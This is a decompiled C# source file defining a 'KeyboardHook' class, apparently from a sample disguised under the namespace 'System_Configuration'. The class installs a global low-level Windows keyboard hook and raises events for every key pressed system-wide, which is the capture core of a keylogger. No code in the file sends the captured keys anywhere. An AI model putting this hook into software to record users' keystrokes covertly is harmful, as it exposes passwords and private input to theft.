using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace System_Configuration
{
	// Token: 0x0200000C RID: 12
	public class KeyboardHook
	{
		// Token: 0x0600002D RID: 45
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, KeyboardHook.KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

		// Token: 0x0600002E RID: 46
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KeyboardHook.KBDLLHOOKSTRUCT lParam);

		// Token: 0x0600002F RID: 47
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x06000030 RID: 48 RVA: 0x00002353 File Offset: 0x00000553
		// (remove) Token: 0x06000031 RID: 49 RVA: 0x0000236A File Offset: 0x0000056A
		public static event KeyboardHook.KeyDownEventHandler KeyDown;

		// Token: 0x14000002 RID: 2
		// (add) Token: 0x06000032 RID: 50 RVA: 0x00002381 File Offset: 0x00000581
		// (remove) Token: 0x06000033 RID: 51 RVA: 0x00002398 File Offset: 0x00000598
		public static event KeyboardHook.KeyUpEventHandler KeyUp;

		// Token: 0x06000034 RID: 52 RVA: 0x00004150 File Offset: 0x00002350
		public void Register()
		{
			KeyboardHook.KeyHookDelegate = new KeyboardHook.KeyboardProcDelegate(KeyboardHook.KeyboardProc);
			KeyboardHook.KeyHook = KeyboardHook.SetWindowsHookExA(13, KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000041A0 File Offset: 0x000023A0
		private static int KeyboardProc(int nCode, int wParam, ref KeyboardHook.KBDLLHOOKSTRUCT lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
				{
					KeyboardHook.KeyDownEventHandler keyDownEvent = KeyboardHook.KeyDownEvent;
					if (keyDownEvent != null)
					{
						keyDownEvent((Keys)lParam.vkCode);
					}
					break;
				}
				case 257:
				case 261:
				{
					KeyboardHook.KeyUpEventHandler keyUpEvent = KeyboardHook.KeyUpEvent;
					if (keyUpEvent != null)
					{
						keyUpEvent((Keys)lParam.vkCode);
					}
					break;
				}
				}
			}
			return KeyboardHook.CallNextHookEx(KeyboardHook.KeyHook, nCode, wParam, lParam);
		}

		// Token: 0x0400003C RID: 60
		private const int HC_ACTION = 0;

		// Token: 0x0400003D RID: 61
		private const int WH_KEYBOARD_LL = 13;

		// Token: 0x0400003E RID: 62
		private const int WM_KEYDOWN = 256;

		// Token: 0x0400003F RID: 63
		private const int WM_KEYUP = 257;

		// Token: 0x04000040 RID: 64
		private const int WM_SYSKEYDOWN = 260;

		// Token: 0x04000041 RID: 65
		private const int WM_SYSKEYUP = 261;

		// Token: 0x04000044 RID: 68
		private static int KeyHook;

		// Token: 0x04000045 RID: 69
		private static KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

		// Token: 0x02000044 RID: 68
		private struct KBDLLHOOKSTRUCT
		{
			// Token: 0x04000139 RID: 313
			public int vkCode;

			// Token: 0x0400013A RID: 314
			public int scancode;

			// Token: 0x0400013B RID: 315
			public int flags;

			// Token: 0x0400013C RID: 316
			public int time;

			// Token: 0x0400013D RID: 317
			public int dwExtraInfo;
		}

		// Token: 0x02000045 RID: 69
		// (Invoke) Token: 0x06000176 RID: 374
		private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KeyboardHook.KBDLLHOOKSTRUCT lParam);

		// Token: 0x02000046 RID: 70
		// (Invoke) Token: 0x0600017A RID: 378
		public delegate void KeyDownEventHandler(Keys Key);

		// Token: 0x02000047 RID: 71
		// (Invoke) Token: 0x0600017E RID: 382
		public delegate void KeyUpEventHandler(Keys Key);
	}
}
